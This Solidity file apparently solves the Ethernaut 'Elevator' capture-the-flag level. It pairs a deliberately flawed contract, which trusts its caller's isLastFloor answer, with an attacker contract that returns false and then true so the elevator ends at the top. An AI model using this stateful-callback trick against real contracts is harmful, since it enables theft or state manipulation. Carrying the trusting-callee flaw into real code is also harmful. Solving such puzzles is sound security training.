// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint) external returns (bool);
}

contract Elevator {
    bool public top;
    uint public floor;

    function goTo(uint _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

interface IElevator {
    function goTo(uint _floor) external;
}

contract ElevatorDestroyer {
    bool state;

    function isLastFloor(uint _floor) public returns (bool) {
        bool oldState = state;
        state = true;
        return oldState;
    }

    function goToLastFloor(IElevator _addr) public {
        state = false;
        _addr.goTo(1);
    }
}
